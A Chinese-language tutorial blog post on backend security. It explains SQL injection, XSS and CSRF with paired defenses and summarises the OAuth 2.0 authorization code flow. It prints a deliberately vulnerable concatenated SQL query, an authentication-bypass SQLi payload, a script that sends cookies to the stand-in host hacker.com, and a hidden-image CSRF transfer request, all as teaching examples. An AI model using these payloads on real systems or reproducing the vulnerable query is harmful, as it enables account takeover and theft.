從 SQL Injection 到 OAuth 2.0，必備的資安攻防知識

發表於 2025-10-29 分類於 技術筆記

作為後端工程師，每天都在打造功能、優化效能、建立穩固的系統。然而，在程式碼的字裡行間，一個微小的疏忽就可能成為駭客入侵的後門。安全性不是資安專家的專利，而是每一位後端工程師刻在骨子裡的責任。

這篇文章不只是一份安全清單，更是一場攻防演練，將從最經典的漏洞開始，逐步探討現代化的授權機制，幫助建立起一套完整的後端安全思維。

攻防戰一：資料庫的致命缺口 — SQL Injection

SQL Injection（SQLi）堪稱是 Web 安全史上最古老、也最具破壞力的漏洞之一。它能讓攻擊者繞過應用邏輯，直接對資料庫下達指令。

攻擊場景 (The Attack)

想像一下，有一個簡單的登入功能，後端程式碼是這樣寫的 (以 Node.js 為例)：

// !!! 這是一段極度危險的程式碼 !!!
const userInputUsername = ctx.request.body.username;
const sql = `SELECT * FROM users WHERE username = '${userInputUsername}'`;
const user = await db.query(sql);

使用者正常輸入時，一切安好。但如果攻擊者在輸入框裡填入：

' OR '1'='1' --

後端拼接出的 SQL 語句就會變成：

SELECT * FROM users WHERE username = '' OR '1'='1' --'
  • ' OR '1'='1' 永遠為真，WHERE 條件被直接繞過。
  • -- 是 SQL 的註解符號，它會讓後續的語法 (例如密碼檢查) 全部失效。

結果：攻擊者無需密碼，就能登入系統中的第一個帳號（通常是管理員），甚至可以進一步執行 DROP TABLE 等毀滅性操作。

防禦策略 (The Defense)

防禦 SQLi 的核心原則是：永遠不要信任使用者的輸入，並將「程式碼」與「資料」徹底分離。

解法：參數化查詢 (Parameterized Queries / Prepared Statements)

所有主流的資料庫驅動程式都支援參數化查詢。讓我們重寫上面的程式碼：

// ✅ 安全的寫法
const userInputUsername = ctx.request.body.username;
const sql = `SELECT * FROM users WHERE username = ?`;
const user = await db.query(sql, [userInputUsername]);

為什麼這樣就安全了？

  • 資料庫會先編譯 SELECT * FROM users WHERE username = ? 這個 SQL 結構。
  • 然後，userInputUsername 的值會作為一個純粹的字串資料被傳入 ? 的位置。
  • 即使攻擊者輸入 ' OR '1'='1' --，它也只會被當成一個完整的、荒謬的用戶名去查詢，而不會被當成 SQL 語法執行。

防禦心法：停止手動拼接 SQL 字串。將所有使用者輸入都視為潛在的惡意資料，並透過參數化查詢的機制交由資料庫驅動來處理。

攻防戰二：前端的信任危機 — XSS & CSRF

當後端服務需要渲染 HTML 或處理來自瀏覽器的請求時，戰場就從伺服器轉移到了使用者的瀏覽器。

1. 跨網站指令碼 (Cross-Site Scripting, XSS)

  • 攻擊原理：攻擊者將惡意 JavaScript 腳本注入到網站頁面中，當其他使用者瀏覽該頁面時，這段腳本就會在他們的瀏覽器上執行。
  • 攻擊場景：在一個部落格的留言區，攻擊者提交了一條留言：<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>。如果後端沒有處理，直接將這段內容存入資料庫，並在頁面上渲染出來，那麼每個看到這條留言的使用者的 Cookie 都會被發送到攻擊者的伺服器。
  • 防禦策略：
    • 輸出編碼 (Output Encoding)：在將使用者內容渲染到 HTML 前，對特殊字元進行編碼。例如，< 變成 &lt;，> 變成 &gt;。幾乎所有的現代前端框架（React, Vue）和後端樣板引擎（EJS, Jinja2）都預設開啟此功能。
    • 內容安全策略 (Content Security Policy, CSP)：透過 HTTP Header 告訴瀏覽器，只允許載入和執行來自你指定來源的腳本，有效降低 XSS 的風險。

2. 跨站請求偽造 (Cross-Site Request Forgery, CSRF)

  • 攻擊原理：誘騙已登入的使用者，在他們不知情的情況下，點擊一個惡意連結或載入一個惡意頁面，從而以他們的身份向你的網站發送一個他們不希望的請求（例如：轉帳、刪除文章）。
  • 攻擊場景：小明登入了網路銀行。接著，他收到一封 email，點開了一個有趣的貓咪圖片網站。該網站的頁面中隱藏了這樣的程式碼：<img src="https://bank.com/transfer?to=hacker&amount=10000" style="display:none;">。瀏覽器會自動帶上小明在 bank.com 的 Cookie，向銀行發起轉帳請求，而銀行會認為這是小明本人的操作。
  • 防禦策略：
    • Anti-CSRF Token：使用者訪問表單頁面時，伺服器生成一個隨機的、不可預測的 Token，並將其嵌入表單。當使用者提交表單時，伺服器會驗證這個 Token 是否匹配。攻擊者無法得知這個隨機 Token，因此無法偽造請求。
    • SameSite Cookie 屬性：將 Cookie 設置為 SameSite=Lax 或 Strict，可以指示瀏覽器不要在跨站請求中發送該 Cookie，從根本上阻止 CSRF 攻擊。

現代化的授權框架：OAuth 2.0

隨著微服務和第三方應用生態的興起，面臨一個新的問題：如何在不洩漏使用者密碼的前提下，安全地授權一個應用（Client）去訪問另一個應用（Resource Server）上的使用者資料？

這就是 OAuth 2.0 要解決的核心問題。它是一個授權 (Authorization) 框架，而不是認證 (Authentication) 協議。

記住這點：Authentication 是確認「你是誰」，Authorization 是確認「你能做什麼」。

OAuth 2.0 的核心角色

  1. 資源擁有者 (Resource Owner)：你，也就是使用者。
  2. 用戶端 (Client)：第三方應用，例如一個想讀取你 Google 相簿的相片沖印服務。
  3. 授權伺服器 (Authorization Server)：負責驗證使用者身份、獲取使用者同意，並發放「令牌」的服務，例如 accounts.google.com。
  4. 資源伺服器 (Resource Server)：儲存使用者資料的服務，例如 Google 相簿的 API。

簡化的授權碼模式流程 (Authorization Code Grant)

  1. 使用者請求：在「相片沖印服務」上點擊「使用 Google 相簿匯入」。
  2. 重定向：「相片沖印服務」將瀏覽器重定向到 Google 的授權頁面，並附上它想要的權限（scope，例如 read_photos）。
  3. 使用者授權：在 Google 的頁面上登入，並同意「相片沖印服務」讀取相簿。注意：密碼只給了 Google，從未給過第三方服務。
  4. 取得授權碼：Google 將瀏覽器重定向回「相片沖印服務」，並附上一個一次性的授權碼 (Authorization Code)。
  5. 交換存取權杖：相片沖印服務的後端，用這個授權碼加上它自己的客戶端密鑰 (Client Secret)，向 Google 的授權伺服器發起請求，換取一個存取權杖 (Access Token)。
  6. 訪問資源：從此以後，「相片沖印服務」就可以使用這個 Access Token，向 Google 相簿的 API 請求你的照片了。

OAuth 2.0 透過這套嚴謹的流程，實現了權限的最小化、可控化與密碼的隔離，已成為現代 API 安全的基石。

結論

攻擊類型 核心弱點 關鍵防禦策略
SQL Injection 伺服器端信任了使用者輸入，並將其作為程式碼執行 參數化查詢 (Prepared Statements)
XSS 前端頁面信任了從後端獲取的內容，並將其作為程式碼執行 輸出編碼 (Output Encoding)、內容安全策略 (CSP)
CSRF 伺服器端信任了來自合法使用者瀏覽器的請求，無法分辨真偽 Anti-CSRF Token、SameSite Cookies
API 授權混亂 第三方應用需要訪問使用者資料，傳統密碼共享模式極不安全 使用 OAuth 2.0 框架進行標準化授權

後端安全是一個持續對抗的過程。它要求我們不僅僅是完成功能，更要時刻保持懷疑，對每一個外部輸入、每一次資料庫操作、每一次 API 授權都進行審慎的思考。

將安全意識融入每一次 commit，是成為一名優秀後端工程師的必經之路。
